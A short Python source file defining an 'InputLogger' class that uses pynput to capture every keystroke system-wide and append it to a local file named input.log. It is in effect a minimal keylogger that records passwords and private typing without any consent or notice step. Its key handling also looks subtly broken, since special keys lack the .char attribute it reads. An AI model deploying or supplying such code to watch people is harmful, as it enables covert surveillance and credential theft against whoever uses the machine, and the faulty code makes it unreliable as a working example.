from pynput.keyboard import Listener


class InputLogger:
    def get_event_press(self, event):
        key = event.char or str(event)
        self.save(key)

    def save(self, key):
        with open("input.log", "a") as output:
            output.write(key)

    def run(self):
        with Listener(on_press=self.get_event_press) as listener:
            listener.join()
